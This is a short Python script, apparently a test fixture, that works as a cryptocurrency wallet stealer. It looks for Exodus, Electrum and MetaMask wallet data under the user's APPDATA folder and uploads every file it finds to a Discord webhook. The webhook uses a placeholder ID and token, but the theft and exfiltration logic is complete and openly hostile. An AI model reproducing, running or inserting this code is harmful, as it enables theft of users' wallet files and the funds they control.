import os
import requests

WEBHOOK = "https://discord.com/api/webhooks/000000000000000000/fixture-token"
APPDATA = os.getenv("APPDATA", "")

WALLETS = {
    "Exodus": os.path.join(APPDATA, "Exodus", "exodus.wallet"),
    "Electrum": os.path.join(APPDATA, "Electrum", "wallets"),
    "MetaMask": "Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
}


def grab():
    for name, path in WALLETS.items():
        if os.path.exists(path):
            requests.post(WEBHOOK, files={name: open(path, "rb")})
